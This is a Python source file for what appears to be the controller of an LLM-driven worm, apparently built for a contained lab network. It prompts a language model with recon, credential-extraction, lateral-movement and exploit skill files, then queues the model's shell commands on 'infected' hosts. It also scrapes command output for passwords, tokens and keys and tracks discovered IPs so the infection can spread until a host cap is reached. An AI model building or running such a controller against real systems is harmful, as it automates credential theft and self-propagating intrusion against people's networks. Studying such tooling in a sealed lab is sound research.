import json
import logging
import os
import re
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
import yaml

from models import HostMemory

log = logging.getLogger("brain")


class Brain:
    def __init__(self, config_path: str, skills_dir: str, run_id: str, log_dir: str):
        with open(config_path) as f:
            cfg = yaml.safe_load(f)

        llm_cfg = cfg["llm"]
        # LLM_MODEL env var overrides config — swap models without rebuild
        self._model = os.environ.get("LLM_MODEL") or llm_cfg["model"]
        key_env = llm_cfg.get("api_key_env", "")
        self._api_key = os.environ.get(key_env, "") if key_env else ""
        self._api_base = llm_cfg["api_base"].rstrip("/")
        self._max_tokens = llm_cfg.get("max_tokens", 512)

        skills = Path(skills_dir)
        self._system = (skills / "system.md").read_text().strip()
        self._recon = (skills / "recon.md").read_text().strip()
        self._extract = (skills / "extract.md").read_text().strip()
        self._lateral = (skills / "lateral.md").read_text().strip()
        self._exploit = (skills / "exploit.md").read_text().strip()

        self._max_hosts = cfg.get("run", {}).get("max_hosts", 999)

        self._run_id = run_id
        trace_dir = Path(log_dir) / run_id
        trace_dir.mkdir(parents=True, exist_ok=True)
        self._trace = trace_dir / "trace.jsonl"
        log.info("BRAIN run_id=%s model=%s endpoint=%s/chat/completions trace=%s",
                 run_id, self._model, self._api_base, self._trace)

    # ── logging ───────────────────────────────────────────────────────────────

    def _log(self, host_id: str, event: str, data: dict) -> None:
        entry = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "run_id": self._run_id,
            "host_id": host_id,
            "event": event,
            **data,
        }
        with open(self._trace, "a") as f:
            f.write(json.dumps(entry) + "\n")

    # ── LLM call ──────────────────────────────────────────────────────────────

    def _call_llm(self, host_id: str, prompt: str) -> list[str]:
        self._log(host_id, "llm_prompt", {"model": self._model, "prompt": prompt})
        t0 = time.time()
        try:
            resp = requests.post(
                f"{self._api_base}/chat/completions",
                headers={
                    "Authorization": f"Bearer {self._api_key}",
                    "Content-Type": "application/json",
                },
                json={
                    "model": self._model,
                    "messages": [{"role": "user", "content": prompt}],
                    "max_tokens": self._max_tokens,
                },
                timeout=60,
            )
            resp.raise_for_status()
            raw = (resp.json()["choices"][0]["message"]["content"] or "").strip()
        except Exception as exc:
            log.error("LLM call failed host_id=%s: %s", host_id, exc)
            self._log(host_id, "llm_error", {"error": str(exc)})
            return []

        latency_ms = int((time.time() - t0) * 1000)
        self._log(host_id, "llm_completion", {"completion": raw, "latency_ms": latency_ms})
        log.info("LLM host_id=%s latency_ms=%d raw=%r", host_id, latency_ms, raw[:120])
        return self._parse_commands(host_id, raw)

    def _parse_commands(self, host_id: str, raw: str) -> list[str]:
        # Strip markdown fences the model sometimes adds despite instructions
        text = re.sub(r"^```[a-z]*\s*", "", raw, flags=re.MULTILINE)
        text = text.replace("```", "").strip()
        try:
            cmds = json.loads(text)
            if isinstance(cmds, list) and all(isinstance(c, str) for c in cmds):
                return cmds
        except json.JSONDecodeError:
            pass
        log.warning("Brain: malformed LLM output host_id=%s, skipping: %r", host_id, raw[:200])
        self._log(host_id, "llm_parse_error", {"raw": raw[:200]})
        return []

    # ── memory update ─────────────────────────────────────────────────────────

    _CRED_KEY = re.compile(r'pass|secret|key|token|pwd|api|auth', re.IGNORECASE)
    _NOISE_KEYS = {'PWD', 'OLDPWD'}   # shell builtins that match pattern but aren't credentials

    def _update_credentials(self, host: HostMemory, cmd: str, output: str) -> None:
        pairs = re.findall(r'([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^\s\n]{3,})', output)
        for key, val in pairs:
            if self._CRED_KEY.search(key) and key not in self._NOISE_KEYS:
                entry = {"key": key, "value": val, "source_cmd": cmd}
                if entry not in host.credentials_found:
                    host.credentials_found.append(entry)
                    log.info("CREDENTIAL host_id=%s key=%s", host.host_id, key)
                    self._log(host.host_id, "credential_found", entry)

    def _update_discovered_hosts(self, host: HostMemory, output: str) -> None:
        ips = set(re.findall(r"\b172\.20\.[01]\.\d{1,3}\b", output))
        for ip in sorted(ips):
            if ip != host.local_ip and ip not in host.discovered_hosts:
                host.discovered_hosts.append(ip)
                log.info("DISCOVERED host_id=%s new_ip=%s", host.host_id, ip)
                self._log(host.host_id, "memory_update", {"field": "discovered_hosts", "added": ip})

    # ── public interface ───────────────────────────────────────────────────────

    def on_register(self, host: HostMemory) -> None:
        prompt = "\n\n".join([
            self._system,
            self._recon,
            "A new host just registered:\n" + json.dumps(host.to_dict(), indent=2),
            "Issue recon commands to discover its network neighbors.",
        ])
        self._enqueue(host, self._call_llm(host.host_id, prompt))

    def on_result(
        self,
        host: HostMemory,
        cmd: str,
        output: str,
        infected_ips: set[str] | None = None,
        known_creds: dict | None = None,
        relay_map: dict | None = None,
    ) -> None:
        self._update_discovered_hosts(host, output)
        self._update_credentials(host, cmd, output)

        # M-09: stop lateral movement when max_hosts is reached
        if len(infected_ips or []) >= self._max_hosts:
            log.info("MILESTONE M-09 host_id=%s max_hosts=%d reached — propagation terminated",
                     host.host_id, self._max_hosts)
            self._log(host.host_id, "milestone", {"id": "M-09", "reason": "max_hosts_reached",
                                                   "infected_count": len(infected_ips or [])})
            return

        prompt = "\n\n".join([
            self._system,
            self._recon,
            self._extract,
            self._lateral,
            self._exploit,
            f"Host {host.host_id} ({host.hostname}) returned a result:\nCommand: {cmd}\nOutput:\n{output}",
            "Current host knowledge:\n" + json.dumps(host.to_dict(), indent=2),
            "Already infected IPs: " + json.dumps(sorted(infected_ips or [])),
            "Known credentials by IP (from all infected hosts):\n" + json.dumps(known_creds or {}, indent=2),
            "Relay map (infected IP → IPs it has discovered):\n" + json.dumps(relay_map or {}, indent=2),
            "Issue next commands, or [] if recon, extraction, and lateral movement are complete.",
        ])
        self._enqueue(host, self._call_llm(host.host_id, prompt))

    def _enqueue(self, host: HostMemory, cmds: list[str]) -> None:
        # Deduplicate: skip any command already pending in the queue or run in history
        already_seen = {r.cmd for r in host.history} | set(host.command_queue)
        for cmd in cmds:
            if cmd in already_seen:
                log.info("BRAIN SKIP DUPLICATE host_id=%s cmd=%r", host.host_id, cmd)
                continue
            host.command_queue.append(cmd)
            already_seen.add(cmd)
            log.info("BRAIN QUEUED host_id=%s cmd=%r", host.host_id, cmd)
